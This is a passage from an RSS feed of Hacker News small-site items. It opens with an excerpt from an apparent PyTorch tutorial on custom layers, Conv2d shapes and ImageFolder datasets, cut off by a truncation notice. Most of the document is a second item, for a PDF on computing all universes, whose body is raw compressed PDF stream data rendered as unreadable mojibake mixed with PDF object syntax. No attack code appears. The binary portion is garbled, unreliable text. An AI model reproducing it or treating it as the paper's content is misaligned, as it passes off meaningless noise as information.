        <span>return</span> x<span>.</span>mm(self<span>.</span>weights) <span>+</span> self<span>.</span>bias
</code></pre></div><p>You can see how we wrap our weights tensor in nn.Parameter. This is done to make the tensor to be considered as a model parameter. From PyTorch
<a href="https://pytorch.org/docs/stable/generated/torch.nn.parameter.Parameter.html#parameter" target="_blank" rel="nofollow noopener">docs</a>
:</p><blockquote><p>Parameters are
<a href="https://pytorch.org/docs/stable/tensors.html#torch.Tensor" target="_blank" rel="nofollow noopener">&lt;code&gt;*Tensor*&lt;/code&gt;</a>
subclasses, that have a very special property when used with <em>Module</em> - when they’re assigned as Module attributes they are automatically added to the list of its parameters, and will appear in <em><code>parameters()</code></em> iterator</p></blockquote><p>As you will later see, the <code>model.parameters()</code> iterator will be an input to the optimizer. But more on that later.</p><p>Right now, we can now use this custom layer in any PyTorch network, just like any other layer.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> myCustomLinearLayer(<span>784</span>,<span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        <span>return</span> x
x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCustomNeuralNet()
model(x)<span>.</span>size()
<span>------------------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><p>But then again, Pytorch would not be so widely used if it didn’t provide a lot of ready to made layers used very frequently in wide varieties of Neural Network architectures. Some examples are:
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Linear.html#torch.nn.Linear" target="_blank" rel="nofollow noopener">nn.Linear</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Conv2d.html#torch.nn.Conv2d" target="_blank" rel="nofollow noopener">nn.Conv2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MaxPool2d.html#torch.nn.MaxPool2d" target="_blank" rel="nofollow noopener">nn.MaxPool2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.ReLU.html#torch.nn.ReLU" target="_blank" rel="nofollow noopener">nn.ReLU</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.BatchNorm2d.html#torch.nn.BatchNorm2d" target="_blank" rel="nofollow noopener">nn.BatchNorm2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Dropout.html#torch.nn.Dropout" target="_blank" rel="nofollow noopener">nn.Dropout</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html#torch.nn.Embedding" target="_blank" rel="nofollow noopener">nn.Embedding</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.GRU.html#torch.nn.GRU" target="_blank" rel="nofollow noopener">nn.GRU</a>
/
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LSTM.html#torch.nn.LSTM" target="_blank" rel="nofollow noopener">nn.LSTM</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Softmax.html#torch.nn.Softmax" target="_blank" rel="nofollow noopener">nn.Softmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LogSoftmax.html#torch.nn.LogSoftmax" target="_blank" rel="nofollow noopener">nn.LogSoftmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MultiheadAttention.html#torch.nn.MultiheadAttention" target="_blank" rel="nofollow noopener">nn.MultiheadAttention</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerEncoder.html#torch.nn.TransformerEncoder" target="_blank" rel="nofollow noopener">nn.TransformerEncoder</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerDecoder.html#torch.nn.TransformerDecoder" target="_blank" rel="nofollow noopener">nn.TransformerDecoder</a></p><p>I have linked all the layers to their source where you could read all about them, but to show how I usually try to understand a layer and read the docs, I would try to look at a very simple convolutional layer here.</p><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/3.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p>So, a Conv2d Layer needs as input an Image of height H and width W, with <code>Cin</code> channels. Now, for the first layer in a convnet, the number of <code>in_channels</code> would be 3(RGB), and the number of <code>out_channels</code> can be defined by the user. The <code>kernel_size</code> mostly used is 3x3, and the <code>stride</code> normally used is 1.</p><p>To check a new layer which I don’t know much about, I usually try to see the input as well as output for the layer like below where I would first initialize the layer:</p><div><pre><code data-lang="py">conv_layer <span>=</span> nn<span>.</span>Conv2d(in_channels <span>=</span> <span>3</span>, out_channels <span>=</span> <span>64</span>, kernel_size <span>=</span> (<span>3</span>,<span>3</span>), stride <span>=</span> <span>1</span>, padding<span>=</span><span>1</span>)
</code></pre></div><p>And then pass some random input through it. Here 100 is the batch size.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>3</span>,<span>24</span>,<span>24</span>))
conv_layer(x)<span>.</span>size()
<span>--------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>64</span>, <span>24</span>, <span>24</span>])
</code></pre></div><p>So, we get the output from the convolution operation as required, and I have sufficient information on how to use this layer in any Neural Network I design.</p><hr><h2 id="datasets-and-dataloaders">Datasets and DataLoaders</h2><p>How would we pass data to our Neural nets while training or while testing? We can definitely pass tensors as we have done above, but Pytorch also provides us with pre-built Datasets to make it easier for us to pass data to our neural nets. You can check out the complete list of datasets provided at
<a href="https://pytorch.org/docs/stable/torchvision/datasets.html" target="_blank" rel="nofollow noopener">torchvision.datasets</a>
and
<a href="https://pytorch.org/text/datasets.html" target="_blank" rel="nofollow noopener">torchtext.datasets</a>
. But, to give a concrete example for datasets, let’s say we had to pass images to an Image Neural net using a folder which has images in this structure:</p><pre><code>data
    train
        sailboat
        kayak
        .
        .
</code></pre><p>We can use torchvision.datasets.ImageFolder dataset to get an example image like below:</p><div><pre><code data-lang="py"><span>from</span> torchvision <span>import</span> transforms
<span>from</span> torchvision.datasets <span>import</span> ImageFolder
traindir <span>=</span> <span>"data/train/"</span>
t <span>=</span> transforms<span>.</span>Compose([
        transforms<span>.</span>Resize(size<span>=</span><span>256</span>),
    transforms<span>.</span>CenterCrop(size<span>=</span><span>224</span>),
        transforms<span>.</span>ToTensor()])
train_dataset <span>=</span> ImageFolder(root<span>=</span>traindir,transform<span>=</span>t)
<span>print</span>(…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</a></em></p>]]>
            </description>
            <link>https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065771</guid>
            <pubDate>Thu, 12 Nov 2020 02:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Fastest Way of Computing All Universes (2012) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065400">thread link</a>) | @optimalsolver
<br/>
November 11, 2020 | http://people.idsia.ch/~juergen/fastestuniverse.pdf | <a href="https://web.archive.org/web/*/http://people.idsia.ch/~juergen/fastestuniverse.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>äÈhÓY2_Ê²é[leóŒ‚÷*LÊxäñÎãÉÇÃ€ÎdŽíâ¢Sü
çîl'8ú}GV³±¯z€„{@šÃRXÔBÊ€3´£\ˆÌŽ�e3ƒ9™úP%‘'»O]D?AlÈÿ’¹f§ˆˆY=³{’ÂJØEy†ó6Ëý`ï
lh&lt;ßt{àT_±ãE‘¦°
´"€ƒ„›Ú?ÚÂªz„ìÆFeÈ�èU#®#qR¢úLGÜùa¾Ø)
Ø‰FæÌ\$Änÿ©îE´šø÷ã£‰+4Ï‡Ð¬³¶A¨-ñÈ¹ëjà]�Ñ¦a!ïöùÁÏi8Q	0)�éeFxº„¼ì]‘ÌI+ôØ'_Ô)†Î!ùç"r’àÐÄ0ð0LèÝØ¼yà#RZbVý~&amp;6ÐA7Íäh6±Æ		¤Á.½ÞÊˆRÏ)º¥ÞŽT¶ÔN`=D�4C§EYª1»¹2¡CMð�¤bÜÁÁî85¡bìÅDl6e‘jì¼Ñ¼8¼èLBŒ7á~L˜²–¿ÊÝ‰Dé	K%†·&gt;¸K� ú
òŠ(DÈkXÉóÃ3„{…™ŽJ•Ý²!môSb4·!Æ˜´F‘èˆ×(|ˆ"Ë™N°&nbsp;üq68šÚõ…åm�,ïy@
°—Í
{‰ByG8Ñ'÷2ñv¼7Õ¨´Î¶*�}Îƒæ¡ùêY^aE0Ù5i°;$ÇDñ	x¼4çˆtCÇ=Ð0ß­›QÏ2Êš!~f£]ðÝ]˜8ë('&gt;=˜ßª`ûŒ*è[]–&amp;vWá„à]P,KèwäÙ¼‰44_È¹
&lt;¢W¼_ÕåÏÉÞ9¡ðESI=gF‘7õ]Õ»j¡onüÚì´/~žÓ&gt;Éé¹¦YqB/P2§ý0™Ñ¶5et­‹¦*y‘õqË®$ßp~Ò”Ã¢&gt;º@ËP¼™vÛ�$P&amp;YcWãBÙ‰žs§úÜ®é«–RY¹úAÝÁõ%ùåì‡–õô@3­ÙšÛ1oDÏì6 Eõ£…³
"‘aÛ–bnÖÖêžºHÙ‚Gqwnrm?uó®j�¸.BÎ‘h.ZžjÌö¾J ˜ÜN^ÊxÍ¤eÅëFj]%êö”x,Ó&amp;~Ý•ð¢n’Š‹DÍÄŒsáþªPæ|
�;�þ_
X;YJ{péZºi³;7¯½¥ú±š…SÎþEÿf‡¤M
Úµ‚tGt†´Cjõ«¼Þt™kÕ­Å¨œ®¼ÎTj}œêÞ{q6güJw±ðÂ9â"¯Ñ¼„cþÍ÷¾–\DóÜÚKÁû‰æ»6HÿÕqcokC{•_[R–�»¤¸ „«B7E°Žªù^íþ¡Od�Ÿ¹4îo\S�èªí*úÉ™öŠÅ+ &amp;æX(ã¢&amp;WF¿¦ÊtCUÄ‚,•4‘}'Õ8öÎ]åºGÁßÛW
’·Õ0¢Zx)3‹p£“2tÏú¬€Õ,Áö“öŠZ:)iøÍ”o–h¤åŒç˜î;­‚|ÇßYxXkÈˆÐôUßÈGo›€ä�ª÷hùÍ¢:Ûª«8™T•,ÍefR)…rä„¢”xI1E×˜‹—x8�VDFºªFòšo×:ë}Êt6Šî%óe¯†õãv‰ÐU,Y¦0��Âh·ŸñÿÜãcŽpx-ì¶èç%“ñ®ùÜ­ÆéÈ0OÄôD½8æm¡ÞN˜PÂXHBŽØ“«Ú‰a.û9fˆ�­‚N!!U:»7å‘-p†¸þ=Ñç&gt;¢r0JŠ·Ì’	2³!ÎAÃ‚úS@Ñ@€ªƒú½m&amp;f7/ŠE–`b7&lt;²û	]ô13	u‰E™Öð9/šË0ô*7ä«a¥^Ç8DÆìÖ
éÆpð)Œ¥ÆÍþ@
âýee­nû÷é"›±œïnövç}�
Äp¯¦�µbØaî´K1ií%rýõâ¿3dsÑ$?¡&nbsp;xïxœüXne~Û¾å�¥VôÌ
IÊy‰Òjôi'=è‚Ûš�Ø‹€a¾Z roÈñ©àjñÔÏM€ô18cËþ¸ÆÐñMãÕg�—!˜qµð.Ê½¦HÎÁ
�ÅáJŽ'ô=¹ iÛêÔë0p�+%…–7–w­ã¥p¨w·¼¢�åŽ”CSKtë¢-Rcyân"ª·Hõ0/Õ)Á7ÆvÙJUIz˜lYçŒ	hzÙèp&nbsp;^�&gt;©Ê‹!7ÙÕ¥é„îŸq†3�
$QKŽ4/ô&nbsp;LA�ís&gt;«[àKõz•Ü»ë.ÑácÏfÜÌT-¡¯£ª}R!�í^³ªÚäîð²]Zà-
ŒTïRñqøž@eZÏy±"‹i¦¤™Mª¬ª0¯j“‹
3œ*ò–4ÇÌ˜Vy½p—¾ÆÜ‚ÕògY|bˆ®“&gt;°iÉ[-Ç#áÇR-"BÙ2¡^¨Ÿ•Š�\Æj4Ãeì&amp;s1ñ)eS&lt;+‹’3$n¡öw1Rw}^¤xÐ¶&nbsp;œ4�}Ç=W�s¨›9ˆçj­ÙÏ"ùŽs¥lÄ:üø†1õld=Ä[�º˜�Òbg¥¶çL«ÉØÓÑ?Qè¡æÖª9ÖgŸGÒ¤Å˜óçç€Ð¡�¡3©OScÏBÞTT}ŠÇ8!Ì¯,NW#P�CÎ¹ú®/Ö€,(=ì6jørÍwúôÄ�|eÞ¬h°d^)›YY
´–^¿È=	j™ñáb
®Ù-�yçyu(�¨¬r;©êe·Ëj,ÆJ3´øÚdÚ÷�²Œ¥GŒm«ªý5‡q¹dµ9©-¦Í¹k�•¶§ñ„ž+ò–l6ý&lt;9MPwñRö¢yÆËTöp
K‹[ukbŠ¶�ê*4?Yqÿ$¢«’±1&gt;w"Ú‡SÝÃ±_np#ë½2î›"Õ®æj�ž½Žd¶”S¶ª¸ow!�êOPrRÐÑ$âÍ÷Ö<l}k&r>ù�dÑ24ïÎå’+Í;X-Š¥x—Ü�ñ¥jÓ¿îÏž”uC8)Öx�&nbsp;º•m3¾�WÉsRM8…û‰T‹2d¼¢¤àz‹‹ú¢ÚqÆ(g&nbsp;î“�úVË`¥É’ »6¯!=µ7Ò*„¤w"~¹„’e›8ybJ‚*6­÷ ½‡¹ùi“ƒüœ¹âLKÂ“]æ’EÅ¬À&nbsp;®([ÐïòöÈz_T™u¬�£2ø÷½þ|Ñ$ß‹¿_~\þ·Þ’[
endstream
endobj
4 0 obj
   3245
endobj
2 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-1-0 6 0 R
      /f-2-0 7 0 R
      /f-3-0 8 0 R
      /f-4-0 9 0 R
      /f-5-0 10 0 R
      /f-6-0 11 0 R
      /f-7-0 12 0 R
      /f-8-0 13 0 R
   &gt;&gt;
&gt;&gt;
endobj
14 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 3 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 2 0 R
&gt;&gt;
endobj
16 0 obj
&lt;&lt; /Length 17 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉŠ4Ç¾×SôL+÷†&gt;„Aàƒì~|è®žË ùà×w|±dfÍt[2BóWeeFFÆòÅ’ýëæNµ‡SñþôR»?ýö~úûé_4Šÿ~ûéôÝÕ�~ú÷ö§·­œ{��Çõ±»s-½÷z*C¥·xzûeûîãÅ½¸“?½}lß^�wáú«‹——˜Ó«K—ÿêò…þr•ñÝ•€·1±oîÊo×Ë?Þ~Ø|?·Ö#±òvÇ·Kh¯n¿D÷êîîÝ}]ï¼Ç*ˆ†�&gt;ù&lt;_?z�Y7úŽíé#Æ#;&gt;æWeÂ;3ðîo~÷z×ß}ðIŸuóà6¿¡Ÿk,Ùø
	`C¨ú�C$ÒÙ…�h“„Õ4Ybî"3qÇô¢ŒbƒïßTeýóÉ�Cï§ÿÐÀôÿÏÛ·Ð�;Ý7ïN9ýJzÁDü%…ŸIPÛþËÖÂ¹§~zñ¾œcÍ§_N6ÒÃ9÷ÿ&lt;ýíôãöœ@gçñ{#5Ÿ{XF~—)6IäÏéÿ£AÜ¶¶žcýÁƒØ¹›sçTã"‰J†žKøÃ¢ Ÿ8‡¸ŠÂFþð1&amp;cès?ñaeâ¬!~æcø;9z%WvBR}Ìç˜[ï…€¢žc½eõôfžÎŽNNþö3†»
Óüƒ££›³^b#·�äøÙW]£;97ÀàF&gt;›îç^x™;éãÂGníÜ›ë­(aAœ›#<swï. ¡’·Àubˆ¯ÄvxspïpƒèÍÝh6¹¢¼ß7ššÜn~"6��Ê;wÃ•ÈÑ÷»&¼r÷%t¥ÍÞë’‚œº¬Û7×vx="">‘aØÀŠâÞ‰ÝÚ‘a)æðl™çF´4n´yü´G&nbsp;ó¦ä/z@·‡N,AšŽÀ@‚=€YBDZCÀG¸ÆgyaZþ5&amp;…%ú	¯‰M²KÝmc¹à5“hy=íá»J�9Þ]Wñ`6tìô�•2ŽàÝ¦ëÉ vÖXæôSÐ(«bd™î5šPÐ(ÂnC×¹Ÿh-MÁDçœ†”IßIšbÊÞ,‹fBuEM¹ùÛå¥8õ‡�kX¾Ò+�8/˜)6Æ&nbsp;
¤ãð‘Œ�
áÚ‰mÚ¸&gt;Ö‚ÉÕÀ™�èK.I5ù�çê Ú‹BV„[up„ahO'¤sÈàsè&nbsp;L¹°mÑÛéXzåX)ë%jN:Wõ…4fß§&amp;yFŸ&amp;J4%¤yÙËñ'0^ÔX×ƒëºÈÉ&lt;ËP½_£(;§¢o¤XŸßŸØ;‰ôØ�ÉÖ™"†˜j…‰VFÞ0"x¡Ï"ÚB¢�NÍ&lt;ú
Ž×*}*—Y XSL•¶eaOOÅ1|\m?ÕÆG!&amp;
±ZÞÞØ¸N#+&amp;â!ü9	GšdÅ¡ƒp}$0.0õ¯	žÏñLÞRÜ¡è›zëŠ·eâ~¢CÐúx]
ÅÚ.Óút®µÏõ¼žÐ›jb¨ƒPè¿›Œ�);&lt;{+”l’Åç³ãÓn"·4T˜aúÞ'5À7Lñjw&nbsp;a¢ÎF­ˆ$IÊ
k¬åÒ^c€fÆ`3²Š¤ªØp=¿Cô/$K:~?ÂÍ7sÎèíÜû#ciÃ£šôÌK6v¼Ka7‰~æÑ!Å†¯È&lt;‰ÂD'ÁÅ'”žž…T²3$š)î2]OÀ˜á6ÅŒ+Þóâ+¢Bùê¥Ù%øêÍ¢ZïŒˆWŽÈ…(86Zò¡¢ÈåõåªR¢çÐ)ãeö»°ÒqXñP‘#½I¤É&gt;4V/GÐi7²ü.ˆ)òÞ¬òïMAQva&nbsp;8µGÁæ›Z¶ ±—°¥ç¹ž@ÿ)ùƒ]¾+x.éÅKâÀº±µ#úxÑ3¨“²š;¢&nbsp;˜;ÇCÑÏÅû
í¬C'úªÙJ´×UMI«à7&amp;Ó#�JÜóŽÁ!ñö%BŽ„"å½
&gt;ô	ƒ¾�ÿìÂŒ6¸ÂjãçKN²T¢«~N¸Í	Œ¢·Y&nbsp;.Ê¤p›*‘	tÞmÝ4¹Ýùoà¿2RŸ¤¹ÑQÚ¨²ötâ)ô¨Éþ°K~
ëñx
!O¹‹§óÈ�”�-òÕMŒÊ¨ˆeGo©²RxO9ùj¼ŒWd{‡ä+:ÿØRDjêd�‘{U(fc,Šü¢+ëL+Š,?B£”ý%ËŸaÃk‚Ú<k“iÐ"{¬€¹Éfº…É‡È5ò pb€mfëbØnŠñrÇ¼="" îŽÄ£p´q²Ú•)2£ø@b£•‚çê6�¤Ì@¡i<�ç"ûqz%Ù="">Ì4ë(z9ÃFsÓÌÖ()uƒ˜ò¿†˜gYFF!Â›&gt;É3ÈÅC†‹Ç^Ï5&amp;Øþ—&lt;ãª~ãŸdT—’‘mP¦rö”·*«ßH%£`o¶±XªloôMå*2U=r~yãñ‡\×jC˜ã
“óH%EfçõìNá\Õõ³7/-¤¨åáUÚcàE#¦¼‰Aqù„×+²ÍâxÄ]7«oÄøÝˆÑ¼@ÎÏOX†çð:™¦ó))«XZæ~
ûiøaKúrñZ�,F¶Ûœp	‹eûªxsÎ$ÿÅÁ$×JMK8tx;bÏ±2$êµu•­¬Ý,�À@å•õX£ÉcQÑUd»m¾¹«%
û0øÐxë$
ZNû3ÈYŠD\áŽ#cy’;�@Õ÷¤Å;?gÓšW­J2ÄOT¾�!‚óy†ñdÀ`´þª”ì×ÆèY‘ý¢}Š©ã»n­¢cSjME™7~ÜQaßwÙÊz*báAº+±²¥è¬ÐÇã
¨ÆÞÛÆWnHð :»æÉÜHp�qX2C	èŒ¬�Ù…²�‰«9ýj&amp;·‘®!w¶EÛîºª&nbsp;µœG\Ù‹M�þQ.�¯Þú1CßÆ‹Á—™‹Œ¨*˜¾?1š$É¸@6Ãà!ºÜÜÀB‰lê2ïÀke#�â7¥,-ó¡*ixX³ì�ÓÛ¤‰:7&gt;(=V}D†åÑ3uÓ�¥((%8ç€ñ)×wån6@ßÌ
ßgKè®ŒI¾©�•ç
‚
mð„À—
D.Ä©•��|µ‚JuÀs¤Óg2dã ‰èÇÆÂ�¾óîCVV EŒF˜©ÑùtÕ·àƒ”!�ŒÃÚ¿[¯ŒÂ¾¿Ž(ñ©
ÇßâÚ¾BÆlø�˜·}Š™Ü¬[½ziÞÍZÔÜ
­O3o®adIg‡ec–®_Ê[?2æt‰D¾YÿJÚ”j‚’®sSXKBeêE[ŠÏ²—oÂá.­Ú”›5xrÿ’”ƒ2îË‚ªÆf˜Ø­D21pXâ™Œžw[u&amp;—.É‰€Ü
"úØæ.\ÒáÉ�Ö÷ÒYÉÍàilb&nbsp;;r¢÷8»UF•
ÖË‚~Y�p"“„k×ªçN;Ù¤-#™%“à"Ž N&lt;|XÑC2&nbsp;”~@8‡Å¨;/¹ÃŠzñÆi…ÄçÆhÞ‚ÞM¾"ƒ2zë‘#±ewÜ‰é`=&nbsp;Ô÷9çØÙŒ3QªÏüì°ó@ZŽÂÀrv)$½L½KØûŸ¹ùñÍª
MÒT<h[Þg*à-ÜÑ9Òyq3Ô?n2®&ž�mŠ®¸‡93×Ñ«Ìvvu#;.¸ƒŠÐj…:ú!‰b¹&�yÛ\Çj·�ØÏ¸jß²”Ã3y–w-‡„ã¹Àfg¹Ù¥qbëã>ã¬dÒ±M›ÃòYQ¯&nbsp;õÌÕòÀ/'+ÅrúJlò`Pº­MöVæ#qÆ7R‰9¼k×9¦ä5Ñ”GAízó³¥©Ç­z~û½|Œ2î‘I)Þ¬×[MR—ŠãÄ�$ž[_.JÙÍ6"Úa›ùh=¤,Yš^ÁŒh¥¾ÔùÒMÈV�UX@£ªƒýSôRCÜ¾%r(ìnólk‰V5ÍÍ?h$³·‰•ø‘}[¦L¼hþˆù·%v!(ä¼ä¶:d²’D2´c”=(ÇûZ¾ÇÏ%&nbsp;IåÕâÁã'!_ª÷ðì–€&lt;óÜ_-øVHry®_o	Þõ^�üY!Øí@—7«$¤àNgŸBëéKP»y+{wDoü�ÃUî
}×*HK9«äóµs­¦9üñ“‚S(ÙB,.��Eãb}ÃuÓíÓ®LaIõ�m+‘™§Þò¦— [3ðM½ç\~´è‡~N'ñ)–×ðÁi?8
øk­ÅJR/fÜV°.*&gt;ÏÑo’åKôUï¸Hëz‡ß‚cõŒÐü1ÓÐ&amp;æ®Sµ�†äO��%Ñe›9ë•&nbsp;7,Ä‹¹ÂˆN’ÚKæ&amp;œAj�cHEMìfG…�Pâ¶ÿçIÑ--ÿçÝ•€ŸÍËcí]ó©ùwO#›Š’TûÛ8µ\»pÚäº'MÍl’;È2µÕ8¢½xë%®×/Æ]Pˆg&gt;ºÅ*E¦a¥†È]�-r\½Ã‘—Ÿ¬k\ÃÝÅ`ä.×Ùõ»Ü-oúÃŠxH@@»�Ì‡½ÛåX‹uy)L¢Ý°Ï�‹¼#u�û8yüä„(2¢bõ’‰cÐ~\°S&lt;åû¡}²‡òµO›‡,íž’3ÌqëÁ§{’ßÇEbéƒÑ¥£¬e¯&nbsp;‘%—ÓGþò�ðU•_Ù‰D©wöY4ý’fÙÛ7ñkÇ­gIRÇ,&nbsp;*~7:‡œÜ»šîçÊÈuŒ©ñ&amp;Œ=ëÈ/Œ§±z)Å«·íHsž¯¹vWd8âfY"¼#‹ó‡®«auF±™ëñ
üó˜&amp;kˆ”³½7ý_à«$¯+e¦±èNN(èE�&gt;e¾kòš �Y”†TòYB[µ³çFr§ò�.&lt;ÐptªaþY„i—Gí:UqW-ó—%K©&amp;¿V5âç�_ûPÐûícQî~šÝ'«ßpú=Ð&amp;�BP¹7Âi¶rO8”3u+t´xqó&gt;F{Åý×Ëêïß¶·ÿÖ±8œ
endstream
endobj
17 0 obj
   3732
endobj
15 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-8-0 13 0 R
      /f-9-0 18 0 R
      /f-2-0 7 0 R
      /f-1-0 6 0 R
      /f-6-0 11 0 R
      /f-10-0 19 0 R
      /f-7-0 12 0 R
   &gt;&gt;
&gt;&gt;
endobj
20 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 16 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 15 0 R
&gt;&gt;
endobj
22 0 obj
&lt;&lt; /Length 23 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉ®+Ç
Ý÷WèÔ®y-dáäY^H-É€°³Èï‡‡d
­áù†ïkU×Àb‘‡‡¬þ}1‡\Ý!Y{8æjÜÿ&lt;ü›Zñß¿¾»˜Ã/ÿY¾ÿ²¤µf_¸]«YsªµæCÊhJµøÃ—ß–ïGs4{øòX~:kÜÙÕ“ñç£�ádÂùhO&amp;žéOjM&amp;scA#Þ›äð«w¬‹¹ð¯Ëùç/?,¶®¥TO¢|¹a‰ëÙ•“ÙÎÞœÌÍÜÍCæµÆZŒ²Žæ°ÞÇÏÄ�V{æ…Þcyz‰v�ÇŠ—ñd/&lt;ñÆÜíÕnV÷boúïÝ:ôYwfáFÈëêš}ŠM^g¡1dV»Ñ£ó4u4ÎZÄ;5‘X:ÏBÜÐ=©&nbsp;Xà/_ôÈþþ×ƒY]­‡ÿRÃôÿ¯ËO?S“9Ük;üNç‚ŽøK¾ÒùáØ¶ß–âÖêáhmZ}Ž‡ß­¥º5�ôÿ:üãðãòy‚èVcMàüêk¡	r\«›Zþt:Ø¸Ÿ"¿†ÿo’¶”y½é7Òö]ŒYCö“&amp;2zLî›UA&gt;±:?«¢µ|ó6†½é›¥€ŸX7‹ufçŸåèþNŽžÉ•�L©�ÎDšÇÖ(òê�«%ª§×ÉÓo&amp;’+}!—¾Ÿ¹ð.ˆ6«Îè‹'{†ƒŠ1óoFø&amp;F’cZm2i±™Ý_üØd[Ø)1èrvédiêèù_ÈS7[¨ÓÍ\Íf�¹ZÃÞAb–!æùXJ0‚K7èR×šèx°i}´&gt;®&gt;–ZÓ!–²ÖbjIºi7múB»÷$y€h¤Ú¬ š«gönj¬'ÕC2y8~4@êÆoRV"ï–î7ÚD0üÊ…K@V_$tì&amp;(ý¥y	�ð&amp;bëËx´óì‘VÊô°þf£g€1f˜0«€v1éÜ&amp;J€&gt;˜qF•Ð{3w†T€ÝÐ{(Õ�ŒHŸ|´Ý@gr„¾Œ½`†àéø/uÑ_V±&gt;±šw
;„ÅxÚ¢mLRixÙpù$ÚÄpš/a:&amp;‰IqèX½öLX°Þ‰%ËÉÉ$�Ã‘ä9�~½È]êô“¸iÁó&amp;ž—s—¡)R¾išâ£dùoÒq”L6¹JßšYçÙ¬¹ÓFÖŸÉlRëâ^»À6ƒ“M¡…|
f#v¼é;+š„¹rRCL™Æ­°˜
O‚c“-›éaXiî¾¾Á`sÛ%ìî½õm:AxÕœºåãuŒ7¤XUÌ‹Ý‘âš9»õUEÅ7õ¢£Ïôë:Ôàsç ?mû—w±1¼ÌJ´ÚÁÀœyÆ­û}4ì«Y&lt;Ž1â¾2+ïÊJo+²	°ƒ­%+ö¤vž@°ËùË¯o°Ë"&amp;
ˆÑ¬Ö¥1|2Ó=VÆJ
¼01ió™}Å³V«@›	Þ0Ëic²ZïÑŠG6¾¸{ÀAüIfMCRh�žæUÁ¨*qzU�óˆá´5O±Œh5oUs%e×÷Êq!SäË&lt;ƒÏ«Íñ­v`øl]$,l»	îï,YXCpÄïG"W�ô
6}¢&nbsp;B«šÃ®õ'ØCUÌ˜«Y…cŸa¦k™ÅRTªMº¸g

Ü5‹‚\¢.ïµDŠ'ª*±…¯i)
í¦Ð´o5EˆµÚêy–¯iªÒŽèÌxÍ"hŠS	/À¶ÁÔh�9%Œ)trz`)dsÁàákŒÈ°&amp;í
)Z�yhV'×–Êàs™fævŽº
.Uuê[&lt;È'6Ê]8“Q×Ž´Ÿª“2y�
èÞW[dƒ»�öŸÚ©72
–ADq]ÐKã®÷��£¼e ãq
ZòÖR!íjaÚŽ£$¶µC÷;[×ð|ÈV²ž‚aÖP•}a¿É´5‰ÍðqºDÔ�2—w�Ê[,dïB2DJ²Dñ‚‡Ä–·QÑêö€²–´0x°’"„I�µ�™÷h°Ú4‰’|‘»;ÉÉ-ä°qÈlùÁÓŽlX£+Ùg$Y¦ÔÂrQæÿ! °)g	ã-I(·´´x•%ÓI#4?;Š
